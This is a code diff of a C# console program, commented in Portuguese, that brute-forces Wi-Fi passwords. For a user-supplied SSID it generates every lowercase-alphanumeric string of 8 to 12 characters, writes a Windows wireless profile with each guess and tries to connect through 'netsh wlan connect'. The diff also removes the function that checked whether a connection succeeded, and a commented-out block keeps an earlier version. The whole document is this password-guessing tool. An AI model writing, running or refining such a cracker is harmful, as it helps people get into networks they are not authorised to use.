@@ -3,39 +3,40 @@ using System.Diagnostics;
 using System.Collections.Generic;
 using System.Threading;
 
-using System;
-using System.Collections.Generic;
-using System.Diagnostics;
-
 class Program
 {
     static void Main()
     {
         // Solicitar ao usuário o SSID da rede Wi-Fi:
-
         Console.Write("Digite o nome da rede Wi-Fi (SSID): ");
-
         string ssid = Console.ReadLine();
 
-        // Definir os caracteres e o comprimento da senha:
-
+        // Definir os caracteres permitidos para a senha:
         char[] characters = "abcdefghijklmnopqrstuvwxyz0123456789".ToCharArray();
 
-        int passwordLength = 8; // Defina o comprimento da senha que você quer testar
+        // Definir os limites do comprimento da senha
+        int minPasswordLength = 8; // Comprimento mínimo da senha
+        int maxPasswordLength = 12; // Comprimento máximo da senha
 
-        // Gerar e testar as combinações de senha
-        foreach (var password in GenerateCombinations(characters, "", passwordLength))
+        // Loop externo para variar o comprimento da senha
+        for (int length = minPasswordLength; length <= maxPasswordLength; length++)
         {
-            Console.WriteLine($"Testando senha: {password}");
+            Console.WriteLine($"\nTestando senhas com {length} dígito(s):");
 
-            // Criar o perfil Wi-Fi com a senha gerada
-            CreateWiFiProfile(ssid, password);
+            // Gerar e testar as combinações de senha com o comprimento atual
+            foreach (var password in GenerateCombinations(characters, "", length))
+            {
+                Console.WriteLine($"Testando senha: {password}");
 
-            // Conectar-se à rede Wi-Fi
-            ConnectToWiFi(ssid);
+                // Criar o perfil Wi-Fi com a senha gerada
+                CreateWiFiProfile(ssid, password);
 
-            Thread.Sleep(10000);
+                // Conectar-se à rede Wi-Fi
+                ConnectToWiFi(ssid);
 
+                // Esperar 10 segundos entre as tentativas
+                Thread.Sleep(10000); // Pausa de 10 segundos
+            }
         }
 
         Console.ReadKey();
@@ -134,40 +135,65 @@ class Program
     }
 }
 
+
 ////
 /*
+using System;
 using System.Diagnostics;
+using System.Collections.Generic;
+using System.Threading;
+using System.Collections.Generic;
 
 class Program
 {
     static void Main()
     {
-        // Solicitar ao usuário o SSID e a senha da rede Wi-Fi
+        // Solicitar ao usuário o SSID da rede Wi-Fi:
+
         Console.Write("Digite o nome da rede Wi-Fi (SSID): ");
+
         string ssid = Console.ReadLine();
 
-        Console.Write("Digite a senha da rede Wi-Fi: ");
-        string password = Console.ReadLine();
+        // Definir os caracteres e o comprimento da senha:
 
-        // Criar o perfil Wi-Fi com a senha fornecida
-        CreateWiFiProfile(ssid, password);
+        char[] characters = "abcdefghijklmnopqrstuvwxyz0123456789".ToCharArray();
 
-        // Conectar-se à rede Wi-Fi
-        ConnectToWiFi(ssid);
+        int passwordLength = 8; // Defina o comprimento da senha que você quer testar
 
-        // Verificar se a conexão foi bem-sucedida
-        bool passwordCorrect = CheckWiFiConnectionStatus(ssid);
-
-        if (passwordCorrect)
+        // Gerar e testar as combinações de senha
+        foreach (var password in GenerateCombinations(characters, "", passwordLength))
         {
-            Console.WriteLine("Conexão bem-sucedida!");
-        }
-        else
-        {
-            Console.WriteLine("Falha na conexão. Verifique se a senha está correta.");
+            Console.WriteLine($"{password}");
+
+            // Criar o perfil Wi-Fi com a senha gerada
+            CreateWiFiProfile(ssid, password);
+
+            // Conectar-se à rede Wi-Fi
+            ConnectToWiFi(ssid);
+
+            Thread.Sleep(10000);
+
         }
 
         Console.ReadKey();
+    }
+
+    static IEnumerable<string> GenerateCombinations(char[] characters, string prefix, int length)
+    {
+        if (length == 0)
+        {
+            yield return prefix;
+        }
+        else
+        {
+            foreach (char c in characters)
+            {
+                foreach (var combination in GenerateCombinations(characters, prefix + c, length - 1))
+                {
+                    yield return combination;
+                }
+            }
+        }
     }
 
     static void CreateWiFiProfile(string ssid, string password)
@@ -210,30 +236,6 @@ class Program
     {
         // Executar o comando para se conectar à rede
         ExecuteCommand($"netsh wlan connect name=\"{ssid}\"");
-    }
-
-    static bool CheckWiFiConnectionStatus(string ssid)
-    {
-        string command = "netsh wlan show interfaces";
-        var process = new Process
-        {
-            StartInfo = new ProcessStartInfo
-            {
-                FileName = "cmd.exe",
-                Arguments = "/C " + command,
-                RedirectStandardOutput = true,
-                RedirectStandardError = true,
-                UseShellExecute = false,
-                CreateNoWindow = true
-            }
-        };
-
-        process.Start();
-        string output = process.StandardOutput.ReadToEnd();
-        process.WaitForExit();
-
-        // Verifica se a SSID correta aparece na saída do comando
-        return output.Contains(ssid);
     }
 
     static void ExecuteCommand(string command)
